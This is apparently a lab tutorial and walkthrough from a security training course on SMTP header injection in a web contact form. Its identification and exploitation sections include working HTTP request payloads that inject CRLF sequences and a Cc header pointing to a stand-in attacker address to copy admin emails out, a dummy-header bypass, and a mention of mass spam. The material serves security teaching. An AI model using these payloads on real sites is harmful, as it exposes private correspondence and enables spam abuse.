# SMTP Header Injection

SMTP Header Injection or Email Injection is a vulnerability that allows attackers to inject SMTP headers. The Simple Mail Transfer Protocol (SMTP) is used to send emails. Similar to HTTP, an SMTP message consists of a header section and a body section. SMTP headers are separated by newlines just like HTTP headers. As such, SMTP Header Injection is the injection of headers into an SMTP message.

Web applications often implement email functionality to inform users about certain events. In most cases, user input is reflected in SMTP headers such as the subject or sender. This can lead to CRLF injection attacks if the user input is not sanitized properly.

## Introduction to SMTP Headers

As described above, an SMTP email is structured similarly to an HTTP request or response. The message contains a header section consisting of SMTP headers that can have a special meaning, followed by an empty line to denote the start of the message body. Finally, the email content itself is sent in the message body. Let's have a look at a simple example email:

```smtp
From: webmaster@smtpinjection.htb
To: admin@smtpinjection.htb
Cc: anotherrecipient@test.htb
Date: Thu, 26 Oct 2006 13:10:50 +0200
Subject: Testmail
  
Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua.  
.
```

The SMTP headers define meta information such as the sender, recipients, and subject. Each header is separated by a CRLF control sequence. After the header section, there is an empty line followed by the request body. Finally, the request body is terminated with a single line that contains nothing but a dot.

Here is a short list of some important SMTP headers and their meaning:

*   `From`: contains the sender
*   `To`: contains a single recipient or a list of recipients
*   `Subject`: contains the email title
*   `Reply-To`: contains the email address the recipient should reply to
*   `Cc`: contains recipients that receive a carbon copy of the email
*   `Bcc`: contains recipients that receive a blind carbon copy of the email

## Identification

Let's have a look at an example. The web application in the exercise below implements a simple contact form that sends an email to the admin user:

```http
http://<SERVER_IP>:<PORT>/
```
Contact form with fields: Full name ("evilhacker"), Email address ("evil@attacker.htb"), Phone number ("123456789"), Message ("Hello Admin!"). Note: All messages sent to admin via email. Submit button.

When submitting the data depicted in the screenshot above, the admin receives the following email:

```text
Email details: From: evil@attacker.htb To: admin@smtpinjection.htb Subject: You received a message Message content: "Here is the message: Hello Admin!" Includes headers like Message-ID, Received, Reply-To, and Return-Path.
```

We can identify that our supplied email address gets reflected in the `From` header. Furthermore, our message is reflected in the email body. Just like in the previous sections, we can attempt to inject a CRLF sequence in our supplied email address and supply an arbitrary header to confirm that we have an SMTP Header Injection vulnerability. We can do so with the following request:

```http
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 105
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil@attacker.htb%0d%0aTestheader:%20Testvalue&phone=123456789&message=Hello+Admin%21
```

Looking behind the scenes, we can confirm that our proof of concept header was indeed injected into the email:

```text
Email details: From: evil@attacker.htb To: admin@smtpinjection.htb Subject: You received a message Headers include: Message-ID, Received, Reply-To, Return-Path, Testheader: Testvalue. Message content: "Here is the message: Hello Admin!"
```

Now that we know that the web application is vulnerable to SMTP Header Injection, let's discuss a few options for exploiting this vulnerability.

## Exploitation

In a real-world deployment of a vulnerable web application, we often do not have access to the resulting email, so we cannot confirm whether our header was successfully injected or not. Our first exploitation attempt could be to add ourselves as a recipient of the email. If we receive the email, we know that we successfully injected an SMTP header. We can do this by targeting one of the following SMTP headers: `To`, `Cc`, or `Bcc`. We can inject our own email address into the header to force the SMTP server to send the email to us:

```http
POST /contact.php HTTP/1.1
Host: smtpinjection.htb
Content-Length: 107
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil@attacker.htb%0d%0aCc:%20evil@attacker.htb&phone=123456789&message=Hello+Admin%21
```

This should forward the email to our email address at `evil@attacker.htb`, including any potentially confidential content. We can also utilize the same methodology to force the SMTP server to send spam emails by supplying a huge list of recipients in any of the three SMTP headers mentioned above and sending the request repeatedly. This would make the SMTP server send a lot of emails to the recipients supplied by us.

In some cases, the application might append additional data to our injection point. Consider a scenario where we supply a name and it is reflected in the `Subject` header to form the following line: `You received a message from <name>!`. In this case, an exclamation mark is appended to our input. If we now try to inject a `Cc` header containing our email address, the web application will append the exclamation mark to our email address and thus invalidate it. It is therefore recommended to always inject an additional dummy header after our actual payload to avoid running into such issues. We can do this by specifying an additional line after our payload:

```http
POST /contact.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 151
Content-Type: application/x-www-form-urlencoded

name=evilhacker&email=evil%40attacker.htb%0d%0aCc:%20evil@attacker.htb%0d%0aDummyheader:%20abc&phone=123456789&message=Hello+Admin%21
```

## Lab Walkthrough

After visiting the web application's contact form, students need to notice that all messages are sent to the admin via email, and that sensitive information is being sent to the admin user.

Students need to fill the form with dummy data and intercept the request with Burp Suite. In the form fields, students need to inject the CRLF sequence and use the SMTP header `Cc` (Carbon copy) with the value `evil@attacker.htb` to attempt to receive a copy from the email being sent to the admin:

```http
name=ryansam%40gmail.com%0d%0aCc:+evil@attacker.htb&phone=123&message=Hello+Admin
```

However, when checking the email inbox at `http://mail.smtpinjection.htb:STMPO/`, students will notice that no copy of the email has been received. Most probably, the application is appending additional data to the value of the injection point (the username field's value), thus invalidating the email address `evil@attacker.htb`.

To circumvent this, students need to inject an additional dummy header after the `Cc` header:

```http
name=ryansam%40gmail.com%0d%0aCc:+evil@attacker.htb%0d%0aDoesNotExist:+True&phone=123&message=Hello+Admin
```

Checking the email inbox at `http://mail.smtpinjection.htb:STMPO/`, students will notice that this time an email has been received containing the sensitive information.


